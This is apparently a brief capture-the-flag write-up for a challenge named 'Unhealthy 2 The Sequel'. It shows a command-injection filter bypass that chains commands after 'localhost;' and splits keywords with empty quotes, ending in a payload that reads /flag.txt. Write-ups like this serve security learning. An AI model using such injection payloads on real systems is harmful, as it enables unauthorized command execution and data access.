# Unhealthy 2 The Sequel

My teammate solved this one, but it turned out to be a pretty simple bypass, just putting quotes between the injected `ls` command:

`localhost;l''s`

To retrieve the flag:

```
localhost; c''at /''fl''ag.txt
```
